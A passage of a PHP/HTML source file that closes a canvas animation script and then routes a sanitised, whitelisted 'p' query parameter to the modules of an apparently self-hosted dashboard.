        my = (e.clientY / window.innerHeight - 0.5) * 2;
        if (halo) halo.style.transform = 'translate(' + (mx * 16) + 'px,' + (my * 16) + 'px)';
      }, { passive: true });
    }
    resize(); init();
    if (REDUCED){ ctx.clearRect(0,0,w,h); const c = tone(); for (const m of motes){ ctx.beginPath(); ctx.fillStyle = 'rgba(' + c + ',' + m.a + ')'; ctx.arc(m.x, m.y, m.r, 0, 6.283); ctx.fill(); } }
    else frame();
  })();
</script>
</body>
</html>
<?php
    exit;
} else {
    $__modList = array('dashboard', 'storage', 'domains', 'cloaking', 'notes', 'users', 'firewall', 'monitor', 'notepad');
    $__emeraldPage = isset($_GET['p']) ? strtolower(trim((string)$_GET['p'])) : 'dashboard';
    $__emeraldPage = preg_replace('/[^a-z0-9_\-]/', '', $__emeraldPage);
    if (!in_array($__emeraldPage, $__modList, true)) { $__emeraldPage = 'dashboard'; }
    $GLOBALS['emerald_page'] = $__emeraldPage;
    unset($__modList, $__emeraldPage);
    require_once __DIR__ . '/views/dashboard.php';
}
?>